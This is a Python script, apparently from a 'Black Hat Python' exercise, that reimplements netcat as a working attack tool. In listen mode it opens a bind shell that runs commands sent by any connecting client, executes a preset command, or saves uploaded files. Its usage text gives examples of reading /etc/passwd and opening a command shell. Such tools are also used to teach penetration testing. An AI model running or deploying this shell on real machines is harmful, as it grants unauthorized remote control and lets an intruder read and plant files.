#!/usr/bin/env python3
import sys
import shlex
import socket
import argparse
import textwrap
import subprocess
from threading import Thread

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()
    
    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                
                if response:
                    print(response)
                    buffer = input("Enter Buffer Size: ")
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        
        except KeyboardInterrupt:
                print('\n\033[91m[!] User Terminated \033[0m\n')
                self.socket.close()
                sys.exit()
    
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = Thread(
                target = self.handle, args=(client_socket)
            )
            client_thread.start()
    
    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            
            with open(self.args.upload, 'wb') as file:
                file.write(file_buffer)
            
            message = f'\033[92m[+] File saved {self.args.upload}'
            client_socket.send(message.encode())
        
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'Black Hat Python !: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                
                except Exception as e:
                    print(f'\n\033[91m[!] Server Killed {e} \n\033[0m')
                    self.socket.close()
                    sys.exit()


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BlackHat Python NetCat Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
    netcat.py -t 192.168.1.100 -p 5555  # Connect to the server.
    netcat.py -t 192.168.1.100 -p 5555 -l -c    # Command shell.
    netcat.py -t 192.168.1.100 -p 5555 -l -u=test.txt   # Upload file.
    netcat.py -t 192.168.1.100 -p 5555 -l -e="cat /etc/passwd"  # Execute command.
    echo \'ABC\' | ./netcat.py -t 192.168.1.100 -p 135  # echo text to the server & port 135.
        ''')
    )
    parser.add_argument('-c', '--command', action='store_true', help='Command Shell.')
    parser.add_argument('-e', '--execute', help='Execute specified command.')
    parser.add_argument('-l', '--listen', action='store_true', help='Listening.')
    parser.add_argument('-p', '--port', type=int, default=5555, help='Specified Port.')
    parser.add_argument('-t', '--target', default='127.0.0.1', help='Specified IP address (Default=127.0.0.1).')
    parser.add_argument('-u', '--upload', help='Upload file.')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    
    nc = NetCat(args, buffer.encode())
    nc.run()